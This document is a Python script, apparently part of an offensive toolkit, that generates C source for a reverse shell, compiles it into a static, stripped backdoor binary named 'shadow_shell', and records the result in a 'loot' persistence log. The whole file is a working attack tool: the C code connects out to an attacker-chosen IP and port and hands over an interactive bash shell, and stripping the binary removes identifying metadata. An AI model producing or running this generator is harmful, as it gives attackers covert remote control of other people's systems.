import os
import sys
import subprocess

def compile_static_shell(callback_ip, callback_port):
    """
    Weaponized Static Compiler: Generates a self-contained C backdoor 
    that functions without external dependencies.
    """
    print(f"[*] Generating Static Shell for {callback_ip}:{callback_port}...")

    # C Source for a simple but robust reverse shell
    shell_src = f"""
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {{
    int sock;
    struct sockaddr_in rev_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    rev_addr.sin_family = AF_INET;
    rev_addr.sin_port = htons({callback_port});
    rev_addr.sin_addr.s_addr = inet_addr("{callback_ip}");

    if (connect(sock, (struct sockaddr *)&rev_addr, sizeof(rev_addr)) == 0) {{
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        char *args[] = {{"/bin/bash", "-i", NULL}};
        execve("/bin/bash", args, NULL);
    }}
    return 0;
}}
"""

    try:
        with open("shell.c", "w") as f:
            f.write(shell_src)

        # Compile with -static to include all libraries in the binary
        # We also strip the binary to remove debugging symbols (metadata)
        print("[*] Compiling with GCC (Static & Stripped)...")
        subprocess.run([
            "gcc", "-static", "shell.c", "-o", "shadow_shell", "-s"
        ], check=True)

        print("[!!!] SUCCESS: Static binary 'shadow_shell' created.")
        
        # Log to project loot
        size = os.path.getsize("shadow_shell")
        loot_path = "../../../loot/persistence_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: STATIC_SHELL | IP: {callback_ip} | Size: {size} bytes\n")

    except Exception as e:
        print(f"[-] Compilation Fault: {e}")
        print("[*] Note: Requires 'gcc' and 'glibc-static' headers.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 185_shadow_shell <ip> <port>")
        sys.exit(1)
    
    compile_static_shell(sys.argv[1], sys.argv[2])
